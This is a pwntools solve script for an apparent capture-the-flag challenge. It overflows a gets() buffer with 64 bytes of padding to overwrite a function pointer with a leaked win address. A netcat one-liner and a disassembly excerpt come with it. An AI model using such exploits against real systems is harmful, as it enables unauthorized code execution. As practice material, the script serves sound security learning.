from pwn import *

p = remote('plsdonthaq.me', 2001)
#p = process('./jump')

p.recvuntil('at ')
win_addr = int(p.recvuntil('\n', drop=True), 16)
p.recvline()
#0x48 buffer loc - 0x08 func ptr = 0x40 = 64 bytes padding
padding = b'A'*64

payload = padding + p32(win_addr)
p.sendline(payload)
p.interactive()

# alternatively, this one-liner does the same thing as the script:
# (python -c "print 'A'*64 + '\x36\x85\x04\x08'"; cat) | nc plsdonthaq.me 2001

'''
0804858e <main>:

 80485e1:       8d 45 b8                lea    eax,[ebp-0x48]
 80485e4:       50                      push   eax
 80485e5:       e8 e6 fd ff ff          call   80483d0 <gets@plt>


 8048610:       8b 45 f8                mov    eax,DWORD PTR [ebp-0x8]
 8048613:       ff d0                   call   eax

'''